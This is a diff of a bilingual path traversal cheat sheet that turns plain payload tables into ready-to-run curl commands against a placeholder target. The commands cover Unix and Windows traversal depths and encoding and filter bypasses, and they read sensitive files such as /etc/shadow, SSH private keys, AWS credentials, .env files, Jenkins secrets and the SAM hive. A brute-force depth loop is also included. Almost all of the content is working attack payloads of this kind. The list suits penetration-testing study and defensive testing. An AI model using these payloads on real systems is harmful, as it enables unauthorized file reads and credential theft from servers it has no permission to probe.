@@ -23,21 +23,21 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `../etc/passwd` | Read `/etc/passwd` desde 1 nivel | Single up. |
-| `../../etc/passwd` | 2 levels up | Most common. |
-| `../../../etc/passwd` | 3 levels | Standard. |
-| `../../../../etc/passwd` | 4 levels | Aggressive. |
-| `../../../../../../../../etc/passwd` | 8+ levels | Force-overshoot — extra `../` ignored normalmente. |
-| Trailing slash | `../etc/passwd/` | Algunos parsers normalizan. |
-| Leading slash | `/../etc/passwd` | Inconsistent. |
-| With dot | `../etc/passwd.` | Trailing dot — Unix accepts. |
-| Dot dot dot | `..../etc/passwd` | Some parsers strip pattern. |
-| Self-reference | `./` prefix `./../etc/passwd` | No-op + traversal. |
-| Multiple self-refs | `././../etc/passwd` | Same. |
-| Zero-byte | `../etc/passwd\x00` | Truncate trailing extension. |
-| Mixed | `..//../etc/passwd` | Doble-slash. |
-| Triple-slash | `..///etc/passwd` | Edge. |
-| Tilde expansion | `~/../etc/passwd` | If shell-like resolution. |
+| `curl 'https://target/?file=../etc/passwd'` | Single-level up read /etc/passwd | Shallow probe. |
+| `curl 'https://target/?file=../../etc/passwd'` | 2 levels traversal | Common depth. |
+| `curl 'https://target/?file=../../../../../../etc/passwd'` | Force-overshoot 6 levels — extra ../ ignored | Standard. |
+| `for n in 1 2 3 4 5 6 7 8; do curl -s "https://target/?file=$(python3 -c "print('../'*$n)")etc/passwd" \| grep -m1 root:; done` | Iterate depths 1..8 brute traverse | Discovery. |
+| `curl 'https://target/?file=../etc/passwd/'` | Trailing slash variant | Parser normalize. |
+| `curl 'https://target/?file=/../etc/passwd'` | Leading slash variant | Inconsistent parsers. |
+| `curl 'https://target/?file=../etc/passwd.'` | Trailing dot — Unix accepts | Filter bypass. |
+| `curl 'https://target/?file=..../etc/passwd'` (4 dots) | Dot replacement filter strip pattern | Filter strips `..`. |
+| `curl 'https://target/?file=./../etc/passwd'` | Self-ref prefix | Filter normalize. |
+| `curl 'https://target/?file=././../etc/passwd'` | Multi self-ref | Same. |
+| `curl 'https://target/?file=../etc/passwd%00'` | NUL byte truncate trailing extension | Extension append bypass. |
+| `curl 'https://target/?file=..//../etc/passwd'` | Double-slash variant | Edge parse. |
+| `curl 'https://target/?file=..///etc/passwd'` | Triple slash | Edge. |
+| `curl 'https://target/?file=~/../etc/passwd'` | Tilde expansion abuse | Shell-like resolve. |
+| `curl --data-urlencode "file=../../etc/passwd" -G https://target/` | curl helper URL-encode payload | Encode helper. |
 ^pt-payload-unix
 
 ___
@@ -46,20 +46,22 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `..\\windows\\win.ini` | Read win.ini | Standard probe. |
-| `..\\..\\windows\\win.ini` | 2 niveles | Common. |
-| `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts` | Hosts file | Standard target. |
-| Forward slash en Windows | `../windows/win.ini` | Windows acepta forward slash. |
-| Mixed slash | `..\\windows/win.ini` o `../windows\\win.ini` | Windows tolerates. |
-| Drive letter | `C:\\windows\\win.ini` (sin traversal) | Absolute Windows. |
-| With double backslash | `..\\\\..\\\\..\\\\windows\\\\win.ini` | Edge. |
-| URL-encoded backslash | `..%5Cwindows%5Cwin.ini` | Encoded. |
-| Drive UNC | `\\\\?\\C:\\windows\\win.ini` | UNC paths. |
-| Reserved names | `CON`, `NUL`, `PRN`, `LPT1`, `COM1` | Windows reserved devices. |
-| Trailing dot | `..\\windows\\win.ini.` | Windows strips trailing dot — bypass extension check. |
-| Trailing space | `..\\windows\\win.ini ` | Windows strips trailing space. |
-| Short filename (8.3) | `PROGRA~1\\` instead of `Program Files\\` | Legacy 8.3 names. |
-| Alt data stream | `file.txt::$DATA` | NTFS specific. |
+| `curl 'https://target/?file=..\windows\win.ini'` | Read win.ini (most common probe) | Windows probe. |
+| `curl 'https://target/?file=..\..\windows\win.ini'` | 2 levels Windows | Common. |
+| `curl 'https://target/?file=..\..\..\windows\system32\drivers\etc\hosts'` | Read hosts file | Network info. |
+| `curl 'https://target/?file=../windows/win.ini'` | Forward slash Windows tolerates | Mixed slash. |
+| `curl 'https://target/?file=..\windows/win.ini'` | Mixed back/forward slash | Mixed. |
+| `curl 'https://target/?file=C:\windows\win.ini'` | Absolute Windows path no traversal | Absolute path. |
+| `curl 'https://target/?file=..%5Cwindows%5Cwin.ini'` | URL-encoded backslash | Encode bypass. |
+| `curl 'https://target/?file=\\?\C:\windows\win.ini'` | UNC long path | UNC bypass. |
+| `curl 'https://target/?file=..\windows\win.ini.'` | Trailing dot Windows strips | Extension check bypass. |
+| `curl 'https://target/?file=..\windows\win.ini '` (trailing space) | Trailing space Windows strips | Bypass. |
+| `curl 'https://target/?file=..\PROGRA~1\config.txt'` | 8.3 short filename | Legacy short name. |
+| `curl 'https://target/?file=C:\inetpub\wwwroot\web.config'` | IIS web.config | IIS app. |
+| `curl 'https://target/?file=C:\xampp\apache\conf\httpd.conf'` | XAMPP Apache config | XAMPP. |
+| `curl 'https://target/?file=..\..\boot.ini'` | Legacy boot config Windows | Legacy. |
+| `curl 'https://target/?file=file.txt::$DATA'` | NTFS alternate data stream | NTFS-specific. |
+| `curl 'https://target/?file=..\windows\system32\config\SAM'` | SAM hashes (locked while running) | Locked-but-possible. |
 ^pt-payload-windows
 
 ___
@@ -68,19 +70,21 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Mixed slashes | `..\\..\\../etc/passwd` | Mixed back and forward. |
-| Single + URL encoded | `..%2fetc%2fpasswd` | Forward slash encoded. |
-| Single backslash encoded | `..%5cetc%5cpasswd` | Backslash encoded. |
-| Doble URL encoded `/` | `..%252fetc%252fpasswd` | Multi-decode. |
-| Doble URL encoded `\\` | `..%255cetc%255cpasswd` | Same. |
-| UTF-8 overlong | `..%c0%afetc%c0%afpasswd` | Overlong UTF-8 (legacy). |
-| UTF-16 BOM | `\xfe\xff../etc/passwd` | Edge. |
-| Unicode normalization | `..％2Fetc／passwd` (full-width `／`) | NFKC-style. |
-| HTML entities | `..&#x2f;etc&#x2f;passwd` | If reflected en HTML. |
-| Encoded null | `..%00etc%00passwd` | NUL byte. |
-| Hex escape | `..\x2fetc\x2fpasswd` | If literal escape. |
-| Octal | `..\057etc\057passwd` | Same. |
-| Plus instead of space | `+` decoded a space | URL form-encoded. |
+| `curl 'https://target/?file=..%2fetc%2fpasswd'` | URL-encoded forward slash | Standard URL encode. |
+| `curl 'https://target/?file=..%5cetc%5cpasswd'` | URL-encoded backslash | Backslash variant. |
+| `curl 'https://target/?file=..%252fetc%252fpasswd'` | Double URL-encoded `%252f` | Multi-decode bypass. |
+| `curl 'https://target/?file=..%255cetc%255cpasswd'` | Double URL-encoded backslash | Multi-decode. |
+| `curl 'https://target/?file=..%c0%afetc%c0%afpasswd'` | UTF-8 overlong slash (legacy) | Pre-2010 servers. |
+| `curl 'https://target/?file=..%c1%9cetc%c1%9cpasswd'` | UTF-8 overlong backslash | Legacy. |
+| `curl --data-urlencode "file=..／etc／passwd" -G https://target/` (U+FF0F full-width) | Unicode full-width slash | NFKC normalize. |
+| `curl 'https://target/?file=..&#x2f;etc&#x2f;passwd'` (HTML reflected context) | HTML entity slash | Reflected HTML. |
+| `curl 'https://target/?file=..%00.\..\etc\passwd'` | NUL byte truncate | Truncate. |
+| `curl 'https://target/?file=..\057etc\057passwd'` | Octal slash | Edge literal. |
+| `curl 'https://target/?file=..\x2fetc\x2fpasswd'` | Hex escape slash | Edge interpreter. |
+| `python3 -c "print(''.join('%%%02x' % ord(c) for c in '../../etc/passwd'))"` | Custom hex percent-encode | DIY encoder. |
+| `python3 -c "import urllib.parse as u; print(u.quote(u.quote('../../etc/passwd')))"` | Double URL-encode | Multi-decode chain. |
+| `curl 'https://target/?file=..\..\..%c0%aeetc%c0%aepasswd'` | UTF-8 overlong dot | Edge legacy. |
+| `curl --data-urlencode "file=../+../etc/passwd" -G https://target/` | Plus-encoded space (URL form) | URL form-encode. |
 ^pt-payload-mixed
 
 ___
@@ -89,33 +93,34 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `/etc/passwd` | Linux | Direct, sin traversal. |
-| `/etc/shadow` | Linux | Hash file (root-only). |
-| `/proc/self/environ` | Linux | Env vars del proceso. |
-| `/proc/self/cmdline` | Linux | Command-line args. |
-| `/proc/self/status` | Linux | Process status. |
-| `/proc/self/maps` | Linux | Memory map. |
-| `/proc/version` | Linux | Kernel version. |
-| `/proc/self/fd/N` | Linux | File descriptors. |
-| `C:\\windows\\win.ini` | Windows | Probe legible. |
-| `C:\\windows\\system32\\drivers\\etc\\hosts` | Windows | Hosts. |
-| `C:\\inetpub\\wwwroot\\web.config` | Windows IIS | Connection strings. |
-| `C:\\xampp\\apache\\conf\\httpd.conf` | Windows Apache | Config. |
-| `/var/log/apache2/access.log` | Linux Apache | Logs. |
-| `/var/log/nginx/access.log` | Linux nginx | Logs. |
-| `/etc/hostname` / `/etc/hosts` | Linux | Network info. |
-| `/etc/issue` | Linux | OS version. |
-| `/var/www/html/config.php` | Linux PHP app | Config. |
-| `/etc/apache2/sites-enabled/default.conf` | Linux Apache config | Site config. |
-| `/etc/nginx/sites-enabled/default` | Linux nginx | Same. |
-| `~/.ssh/id_rsa` | Linux user home | SSH keys. |
-| `~/.bash_history` | Linux | Shell history. |
-| `~/.aws/credentials` | Linux | AWS creds. |
-| `/root/.ssh/id_rsa` | Linux root | SSH keys. |
-| Tomcat conf | `/etc/tomcat9/tomcat-users.xml` | Tomcat creds. |
-| Jenkins secrets | `/var/lib/jenkins/secrets.xml` | Jenkins. |
-| Git internals | `.git/config`, `.git/HEAD` | Git repo. |
-| Webroot | `/var/www/html/`, `C:\\inetpub\\wwwroot\\` | Web docs. |
+| `curl 'https://target/?file=/etc/passwd'` | Linux users list | Standard target. |
+| `curl 'https://target/?file=/etc/shadow'` | Hash file (root-only) | Privileged. |
+| `curl 'https://target/?file=/proc/self/environ'` | Process environment vars (secrets!) | High-value. |
+| `curl 'https://target/?file=/proc/self/cmdline'` | Process command-line args | Process recon. |
+| `curl 'https://target/?file=/proc/self/status'` | Process status info | Process recon. |
+| `curl 'https://target/?file=/proc/self/maps'` | Memory map | Memory recon. |
+| `curl 'https://target/?file=/proc/version'` | Kernel version | OS recon. |
+| `curl 'https://target/?file=/proc/self/fd/0'` | Process FD 0 (stdin) | FD probe. |
+| `curl 'https://target/?file=/etc/hostname'` | System hostname | Recon. |
+| `curl 'https://target/?file=/etc/issue'` | OS release info | Recon. |
+| `curl 'https://target/?file=/etc/hosts'` | Hosts file network info | Network recon. |
+| `curl 'https://target/?file=/var/www/html/config.php'` | PHP app config | App secrets. |
+| `curl 'https://target/?file=/etc/apache2/sites-enabled/000-default.conf'` | Apache vhost config | Web config. |
+| `curl 'https://target/?file=/etc/nginx/sites-enabled/default'` | nginx vhost config | Web config. |
+| `curl 'https://target/?file=/var/log/apache2/access.log'` | Apache access log (RCE pivot via log poison) | Log poison. |
+| `curl 'https://target/?file=/var/log/nginx/access.log'` | nginx access log | Log poison. |
+| `curl 'https://target/?file=/root/.ssh/id_rsa'` | Root SSH private key | Privesc. |
+| `curl 'https://target/?file=/home/USERNAME/.ssh/id_rsa'` | User SSH key | Lateral. |
+| `curl 'https://target/?file=/root/.bash_history'` | Bash history command secrets | Post-exploit. |
+| `curl 'https://target/?file=/root/.aws/credentials'` | AWS credentials | Cloud creds. |
+| `curl 'https://target/?file=/etc/tomcat9/tomcat-users.xml'` | Tomcat user/pass | Tomcat. |
+| `curl 'https://target/?file=/var/lib/jenkins/secrets.xml'` | Jenkins secrets master key | Jenkins. |
+| `curl 'https://target/?file=/var/www/html/.git/config'` | Git repo config (origin URL leak) | Git leak. |
+| `curl 'https://target/?file=/var/www/html/.env'` | Dotenv file secrets | Modern app secrets. |
+| `curl 'https://target/?file=C:\inetpub\wwwroot\web.config'` | IIS web.config connection strings | IIS. |
+| `curl 'https://target/?file=C:\xampp\apache\conf\httpd.conf'` | XAMPP Apache config | XAMPP. |
+| `curl 'https://target/?file=C:\windows\system32\config\SAM'` | SAM (locked while running) | Edge. |
+| `curl 'https://target/?file=C:\Users\Administrator\.ssh\id_rsa'` | Windows admin SSH key | Win privesc. |
 ^pt-payload-absolute
 
 ***
